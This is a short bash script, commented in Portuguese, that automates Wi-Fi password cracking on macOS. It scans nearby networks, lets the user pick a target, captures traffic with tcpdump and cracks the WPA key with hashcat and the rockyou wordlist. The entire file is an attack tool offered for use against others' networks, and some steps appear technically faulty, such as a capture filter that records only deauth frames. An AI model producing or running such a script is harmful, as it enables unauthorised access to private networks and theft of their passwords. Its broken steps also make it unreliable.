#!/bin/bash
# wifi_snatch_mac.sh - Autodetecta Wi-Fi, captura handshake e quebra senha no macOS
# Uso: chmod +x wifi_snatch_mac.sh && sudo ./wifi_snatch_mac.sh

set -e

WORDLIST="$HOME/rockyou.txt"  # <-- coloque o caminho da sua wordlist aqui
CAPDIR="/tmp/wifi_snatch"
mkdir -p "$CAPDIR"
cd "$CAPDIR"

# Detecta interface Wi-Fi
IFACE=$(networksetup -listallhardwareports | awk '/Wi-Fi|AirPort/ {getline; print $2}')
echo "[+] Interface Wi-Fi detectada: $IFACE"

# Desassocia e coloca em modo monitor (airport)
echo "[+] Ativando modo monitor..."
sudo airport -z
sudo airport -c1 >/dev/null 2>&1

# Lista redes
echo "[+] Escaneando redes..."
sudo airport -s | nl -w2 -s') '
read -p "Escolha o número da rede: " NUM
TARGET=$(sudo airport -s | sed -n "${NUM}p")
BSSID=$(echo "$TARGET" | awk '{print $2}')
CH=$(echo "$TARGET" | awk '{print $4}')
ESSID=$(echo "$TARGET" | awk '{print $1}')

echo "[+] Alvo: $ESSID | BSSID: $BSSID | Canal: $CH"

# Captura handshake
CAPFILE="$CAPDIR/${ESSID// /_}.pcap"
echo "[+] Capturando handshake (30s)..."
sudo tcpdump -i "$IFACE" -w "$CAPFILE" type mgt subtype deauth >/dev/null 2>&1 &
TPID=$!
sleep 30
sudo kill $TPID 2>/dev/null
wait $TPID 2>/dev/null

# Converte para formato hashcat (22000)
echo "[+] Convertendo para hashcat..."
hcxp="$CAPDIR/hash.hc22000"
sudo hcxpcapngtool -o "$hcxp" "$CAPFILE" 2>/dev/null || {
    echo "[-] Falha ao converter. Instale hcxpcapngtool (brew install hcxpcapngtool)"
    exit 1
}

# Quebra senha
echo "[+] Quebrando senha com hashcat..."
hashcat -m 22000 "$hcxp" "$WORDLIST" --force

# Exibe senha
CRACKED=$(hashcat -m 22000 "$hcxp" --show | cut -d: -f3)
if [[ -n "$CRACKED" ]]; then
    echo "[+] Senha de $ESSID: $CRACKED"
else
    echo "[-] Senha não encontrada na wordlist"
fi